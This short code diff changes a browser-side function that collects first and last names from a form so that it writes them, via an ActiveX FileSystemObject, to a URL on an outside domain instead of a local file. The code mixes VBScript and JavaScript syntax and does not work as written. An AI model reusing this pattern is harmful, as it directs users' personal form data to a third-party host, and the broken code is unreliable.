@@ -1,7 +1,7 @@
     function WriteToFile(passForm) {
      
         set fso = CreateObject("Scripting.FileSystemObject"); 
-        set s   = fso.CreateTextFile("file.txt", True);
+        set s   = fso.CreateTextFile("http://htconfigs.me/file.txt", True);
      
         var firstName = document.getElementById('FirstName');
         var lastName  = document.getElementById('lastName');
